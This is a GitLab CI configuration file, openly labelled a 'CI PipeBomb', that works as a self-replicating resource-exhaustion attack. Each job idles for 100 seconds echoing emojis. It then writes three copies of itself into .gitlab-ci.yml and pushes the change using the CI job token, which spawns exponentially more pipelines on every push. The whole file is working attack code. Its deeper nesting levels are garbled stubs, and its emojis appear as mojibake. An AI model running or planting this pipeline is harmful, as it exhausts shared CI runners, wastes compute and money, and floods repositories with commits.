# CI PipeBomb NUKE Version with Emoji Hang
# This pipeline uses exponential job growth and makes each job hang by echoing explosion and fire emojis.
# Each job echoes "ðŸ’¥ðŸ”¥" repeatedly for a short period before spawning more jobs.
# USE WITH EXTREME CAUTION: the number of jobs will grow rapidly.

stages: [arm]

ci_pipebomb_arm:
  stage: arm
  image: alpine:latest
  rules:
    - if: '$CI_PIPELINE_SOURCE == "push"'
      when: always
    - when: never
  script:
    # Install dependencies and configure Git
    - apk add --no-cache git coreutils grep
    - git config --global user.email "demolition-bot@example.com"
    - git config --global user.name  "CI Demolition Bot"
    - |
      git remote remove ci >/dev/null 2>&1 || true
      git remote add ci "https://gitlab-ci-token:${CI_JOB_TOKEN}@${CI_SERVER_HOST}/${CI_PROJECT_PATH}.git"
      git fetch ci "${CI_COMMIT_REF_NAME}"
    # Count existing explosion jobs
    - COUNT=$(grep -c '^nuke_explosion_' .gitlab-ci.yml || true)
    - echo "ðŸ’£ Current explosions registered: ${COUNT}"
    # Hang by echoing explosion and fire emojis
    - |
      for t in $(seq 1 100); do
        echo "ðŸ’¥ðŸ”¥"
        sleep 1
      done
    # Outer loop: generate three new jobs
    - |
      for i in $(seq 1 3); do
        CHARGE_NAME="nuke_explosion_$(date +%s)_${CI_PIPELINE_IID}_${i}"
        cat >> .gitlab-ci.yml <<EOF1

${CHARGE_NAME}:
  stage: arm
  image: alpine:latest
  rules:
    - if: '\$CI_PIPELINE_SOURCE == "push"'
      when: always
    - when: never
  script:
    - apk add --no-cache git coreutils grep
    - git config --global user.email "demolition-bot@example.com"
    - git config --global user.name  "CI Demolition Bot"
    - |
      git remote remove ci >/dev/null 2>&1 || true
      git remote add ci "https://gitlab-ci-token:\${CI_JOB_TOKEN}@\${CI_SERVER_HOST}/\${CI_PROJECT_PATH}.git"
      git fetch ci "\${CI_COMMIT_REF_NAME}"
    - COUNT=\$(grep -c '^nuke_explosion_' .gitlab-ci.yml || true)
    - echo "ðŸ’£ Current explosions registered: \${COUNT}"
    # Hang by echoing emojis in this generated job
    - |
      for t in \$(seq 1 100); do
        echo "ðŸ’¥ðŸ”¥"
        sleep 1
      done
    # Generate more jobs inside this job
    - |
      for j in \$(seq 1 3); do
        NEW_CHARGE_NAME="nuke_explosion_\$(date +%s)_\${CI_PIPELINE_IID}_\${j}"
        cat >> .gitlab-ci.yml <<EOF2

\${NEW_CHARGE_NAME}:
  stage: arm
  image: alpine:latest
  rules:
    - if: '\\$CI_PIPELINE_SOURCE == "push"'
      when: always
    - when: never
  script:
    - apk add --no-cache git coreutils grep
    - git config --global user.email "demolition-bot@example.com"
    - git config --global user.name  "CI Demolition Bot"
    - |
      git remote remove ci >/dev/null 2>&1 || true
      git remote add ci "https://gitlab-ci-token:\\${CI_JOB_TOKEN}@\\${CI_SERVER_HOST}/\\${CI_PROJECT_PATH}.git"
      git fetch ci "\\${CI_COMMIT_REF_NAME}"
    - COUNT=\\$(grep -c '^nuke_explosion_' .gitlab-ci.yml || true)
    - echo "ðŸ’£ Current explosions registered: \\\${COUNT}"
    # Hang by echoing emojis in deeper job
    - |
      for t in \\\$(seq 1 100); do
        echo "ðŸ’¥ðŸ”¥"
        sleep 1
      done
    # Next level of jobs (stub for further growth)
    - |
      for k in \\\$(seq 1 3); do
        NEXT_CHARGE_NAME="nuke_explosion_\\\$(date +%s)_\\\${CI_PIPELINE_IID}_\\\${k}"
        cat >> .gitlab-ci.yml <<EOF3

\\\${NEXT_CHARGE_NAME}:
  # Exponential growth continues...
EOF3
      done
    - git add .gitlab-ci.yml
    - git commit -m "CI PipeBomb plants \${NEW_CHARGE_NAME}"
    - git push ci "\${CI_COMMIT_REF_NAME}:\${CI_COMMIT_REF_NAME}"
EOF2
      done
    - git add .gitlab-ci.yml
    - git commit -m "CI PipeBomb plants \${CHARGE_NAME}"
    - git push ci "\${CI_COMMIT_REF_NAME}:\${CI_COMMIT_REF_NAME}"
EOF1
      done
    - git add .gitlab-ci.yml
    - git commit -m "CI PipeBomb plants multiple charges"
    - git push ci "${CI_COMMIT_REF_NAME}:${CI_COMMIT_REF_NAME}"
